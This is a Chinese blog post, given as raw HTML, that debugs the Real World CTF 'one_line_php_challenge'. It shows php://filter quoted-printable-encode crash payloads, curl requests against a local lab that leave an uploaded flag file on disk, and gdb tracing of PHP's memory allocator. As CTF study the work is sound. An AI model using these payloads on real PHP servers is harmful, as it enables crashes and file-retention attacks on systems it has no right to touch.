@@ -1,0 +1,2224 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Tianji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Tianji">
+    <meta name="keywords" content="ctf题目-php调试分析 | Tianji">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>ctf题目-php调试分析 · Tianji&#39;s Blog</title>
+    <!-- 设置密码 -->
+    <script>
+        (function(){
+            if(''){
+                if (prompt('请输入文章密码','') !== ''){
+                    alert('密码错误！');
+                    history.back();
+                }
+            }
+        })();
+    </script>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Tianji&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">ctf题目-php调试分析</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Tianji's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            ctf题目-php调试分析
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf_php_debug">ctf_php_debug</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">2,975</span> / Reading time: <span class="post-count">16 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/12/05</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="小菜，加油"><a href="#小菜，加油" class="headerlink" title="小菜，加油"></a>小菜，加油</h2><h2 id="php流处理的bug"><a href="#php流处理的bug" class="headerlink" title="php流处理的bug"></a>php流处理的bug</h2><p>案例: realwordctf-one_line_php_challenge</p>
+<p>参考链接: <a href="https://hackmd.io/s/rJlfZva0m#exp" rel="external nofollow" target="_blank">https://hackmd.io/s/rJlfZva0m#exp</a></p>
+<p>ubuntu18.04 复现一直失败，payload打过去之后，即便已经造成segmentfault,上传文件依然保留不下来。我是很懵逼啊. 比赛给的dockerfile，到目前为止也没有运行成功。。。。。。。。。。。。。。。。。。</p>
+<p>先不考虑ubuntu18.04, 直接在ubuntu16.04上调试。</p>
+<p>payload1:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(urldecode(&apos;php://filter/convert.quoted-printable-encode/resource=data:    //,%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf&apos;));</span><br></pre></td></tr></table></figure>
+<p>本机测试payload1，一个都没有成功，那些大佬也不知道怎么搞出来的，懵逼啊，做题，估计还缺点运气。</p>
+<p>php7.2:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tiandiwuji@tiandiwuji:~/Desktop$ php -v</span><br><span class="line">PHP 7.2.10-0ubuntu0.18.04.1 (cli) (built: Sep 13 2018 13:45:02) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.2.10-0ubuntu0.18.04.1, Copyright (c) 1999-2018, by Zend Technologies</span><br><span class="line">tiandiwuji@tiandiwuji:~/Desktop$ cat test.php</span><br><span class="line">&lt;?php</span><br><span class="line">file(urldecode(&apos;php://filter/convert.quoted-printable-encode/resource=data:    //,%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf&apos;));</span><br><span class="line"># file(urldecode(&apos;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&apos;));</span><br><span class="line">?&gt;</span><br><span class="line">tiandiwuji@tiandiwuji:~/Desktop$ php test.php </span><br><span class="line">No core dump</span><br></pre></td></tr></table></figure>
+<p>php7.0:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/php_debug$ php -v</span><br><span class="line">PHP 7.0.32-0ubuntu0.16.04.1 (cli) ( NTS )</span><br><span class="line">Copyright (c) 1997-2017 The PHP Group</span><br><span class="line">Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.0.32-0ubuntu0.16.04.1, Copyright (c) 1999-2017, by Zend Technologies</span><br><span class="line">qianfa@qianfa:~/Desktop/php_debug$ cat test.php</span><br><span class="line">&lt;?php</span><br><span class="line">#file(urldecode(&apos;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA87654321AAAAAAAAAAAAAAAAAAAAAAAA&apos;));</span><br><span class="line">file(urldecode(&apos;php://filter/convert.quoted-printable-encode/resource=data://,%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf%bf&apos;));</span><br><span class="line">echo &quot;No core dump&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">qianfa@qianfa:~/Desktop/php_debug$ php test.php </span><br><span class="line">No core dump</span><br></pre></td></tr></table></figure>
+<p>payload2:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA87654321AAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>
+<p>又产生了区别。嗯，起码出现和大佬一样的报错了。</p>
+<p>php7.0: ubuntu16.04:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/php_debug$ php test.php</span><br><span class="line"></span><br><span class="line">mmap() failed: [12] Cannot allocate memory</span><br><span class="line"></span><br><span class="line">mmap() failed: [12] Cannot allocate memory</span><br><span class="line">PHP Fatal error:  Out of memory (allocated 1883242496) (tried to allocate 3758096384 bytes) in /home/qianfa/Desktop/php_debug/test.php on line 2</span><br></pre></td></tr></table></figure>
+<p>php7.2.12: ubuntu16.04:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/php_debug$ php7 -v</span><br><span class="line">PHP 7.2.12 (cli) (built: Dec  5 2018 10:56:59) ( NTS DEBUG )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line">qianfa@qianfa:~/Desktop/php_debug$ php7 test.php</span><br><span class="line"></span><br><span class="line">Fatal error: Allowed memory size of 134217728 bytes exhausted at /home/qianfa/Desktop/php_debug/php-7.2.12/ext/standard/filters.c:1601 (tried to allocate 117440512 bytes) in /home/qianfa/Desktop/php_debug/test.php on line 2</span><br></pre></td></tr></table></figure>
+<p>php7.2.10: ubuntu18.04:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">tiandiwuji@tiandiwuji:~/Desktop$ php -v</span><br><span class="line">PHP 7.2.10-0ubuntu0.18.04.1 (cli) (built: Sep 13 2018 13:45:02) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.2.10-0ubuntu0.18.04.1, Copyright (c) 1999-2018, by Zend Technologies</span><br><span class="line">tiandiwuji@tiandiwuji:~/Desktop$ php test.php</span><br><span class="line"></span><br><span class="line">mmap() failed: [12] Cannot allocate memory</span><br><span class="line"></span><br><span class="line">mmap() failed: [12] Cannot allocate memory</span><br><span class="line">PHP Fatal error:  Out of memory (allocated 1883242496) (tried to allocate 3758096384 bytes) in /home/tiandiwuji/Desktop/test.php on line 4</span><br><span class="line"></span><br><span class="line">Fatal error: Out of memory (allocated 1883242496) (tried to allocate 3758096384 bytes) in /home/tiandiwuji/Desktop/test.php on line 4</span><br></pre></td></tr></table></figure>
+<p>官方环境, 如期出现500.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/realworldfinal/oneline$ curl-v -F &quot;file=@flag&quot; &quot;http.0.0.1:8080?orange=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA87654321AAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">* Rebuilt URL to: http://127.0.0.1:8080/?orange=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA87654321AAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)</span><br><span class="line">&gt; POST /?orange=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA87654321AAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1:8080</span><br><span class="line">&gt; User-Agent: curl/7.47.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Length: 208</span><br><span class="line">&gt; Expect: 100-continue</span><br><span class="line">&gt; Content-Type: multipart/form-data; boundary=------------------------d4a24c8a4605c592</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 100 Continue</span><br><span class="line">* HTTP 1.0, assume close after body</span><br><span class="line">&lt; HTTP/1.0 500 Internal Server Error</span><br><span class="line">&lt; Date: Wed, 05 Dec 2018 13:49:03 GMT</span><br><span class="line">&lt; Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; </span><br><span class="line">* Closing connection 0</span><br></pre></td></tr></table></figure>
+<p>官方环境，使用最终payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/realworldfinal/oneline$ curl -v -F &quot;file=@flag&quot; &quot;http://127.0.0.1:8080?orange=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">* Rebuilt URL to: http://127.0.0.1:8080/?orange=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)</span><br><span class="line">&gt; POST /?orange=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1:8080</span><br><span class="line">&gt; User-Agent: curl/7.47.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Length: 208</span><br><span class="line">&gt; Expect: 100-continue</span><br><span class="line">&gt; Content-Type: multipart/form-data; boundary=------------------------5385e7ea169feb1a</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 100 Continue</span><br><span class="line">* Empty reply from server</span><br><span class="line">* Connection #0 to host 127.0.0.1 left intact</span><br><span class="line">curl: (52) Empty reply from server</span><br><span class="line"></span><br><span class="line">结果:</span><br><span class="line">root@a2aa31afc385:/tmp# php -v</span><br><span class="line">PHP 7.2.10-0ubuntu0.18.04.1 (cli) (built: Sep 13 2018 13:45:02) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.2.10-0ubuntu0.18.04.1, Copyright (c) 1999-2018, by Zend Technologies</span><br><span class="line">root@a2aa31afc385:/tmp# cat phpul3j1f </span><br><span class="line">flag&#123;afsdf&#125;</span><br></pre></td></tr></table></figure>
+<p>开始使用php7.2.12开始调试:</p>
+<p>首先根据字符串查询文件名:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/php_debug/php-7.2.12$ grep &quot;mmap() failed&quot; -rn -A10 -B5 -l ./</span><br><span class="line">./Zend/zend_language_scanner.o            # 编译之后的文件</span><br><span class="line">./Zend/zend_language_scanner.c</span><br><span class="line">./Zend/zend_alloc.c</span><br><span class="line">./Zend/zend_language_scanner.l</span><br><span class="line">./Zend/.libs/zend_language_scanner.o      # 编译之后的文件</span><br><span class="line">./Zend/.libs/zend_alloc.o        # 编译之后的文件</span><br><span class="line">./Zend/zend_alloc.o              # 编译之后的文件</span><br><span class="line">./sapi/phpdbg/phpdbg             # 可执行文件</span><br><span class="line">./sapi/fpm/php-fpm               # 可执行文件</span><br><span class="line">./sapi/cli/php                   # 可执行文件</span><br><span class="line">./sapi/cgi/php-cgi               # 可执行文件</span><br><span class="line">./sapi/litespeed/lsapilib.c</span><br></pre></td></tr></table></figure>
+<p>zend_language_scanner.l:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/php_debug/php-7.2.12$ cat ./Zend/zend_language_scanner.l | grep mmap</span><br><span class="line">		zend_error_noreturn(E_COMPILE_ERROR, &quot;zend_stream_mmap() failed&quot;);</span><br></pre></td></tr></table></figure>
+<p>zend_language_scanner.c:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/php_debug/php-7.2.12$ cat ./Zend/zend_language_scanner.c | grep mmap</span><br><span class="line">		zend_error_noreturn(E_COMPILE_ERROR, &quot;zend_stream_mmap() failed&quot;);</span><br></pre></td></tr></table></figure>
+<p>查看lsapilib.c:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/php_debug/php-7.2.12/sapi/litespeed$ cat lsapilib.c | grep &quot;mmap() failed&quot;</span><br><span class="line">        perror( &quot;Anonymous mmap() failed&quot; );</span><br></pre></td></tr></table></figure>
+<p>符合条件的只有: <code>./Zend/zend_alloc.c</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/php_debug/php-7.2.12$ cat -n ./Zend/zend_alloc.c | grep &quot;mmap() failed&quot;</span><br><span class="line">   433			fprintf(stderr, &quot;\nmmap() failed: [%d] %s\n&quot;, errno, strerror(errno));</span><br><span class="line">   476			fprintf(stderr, &quot;\nmmap() failed: [%d] %s\n&quot;, errno, strerror(errno));</span><br></pre></td></tr></table></figure>
+<p>调试,下断点，直接结束，不知道啥情况:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/php_debug$ gdb -q php7</span><br><span class="line">pwndbg: loaded 175 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line"></span><br><span class="line">Reading symbols from php7...done.</span><br><span class="line">pwndbg&gt; b /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c: 476</span><br><span class="line">Breakpoint 1 at 0x8d9a2b: file /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c, line 476.</span><br><span class="line">pwndbg&gt; b /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c: 433</span><br><span class="line">Breakpoint 2 at 0x8d98f4: file /home/qianfa/Desktop/php_debug/php-7.2.12/Zend/zend_alloc.c, line 433.</span><br><span class="line">pwndbg&gt; r test.php</span><br><span class="line">Starting program: /usr/bin/php7 test.php</span><br><span class="line">123[Inferior 1 (process 100361) exited normally]</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(urldecode(&apos;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&apos;));</span><br></pre></td></tr></table></figure>
+<p>结果如下:</p>
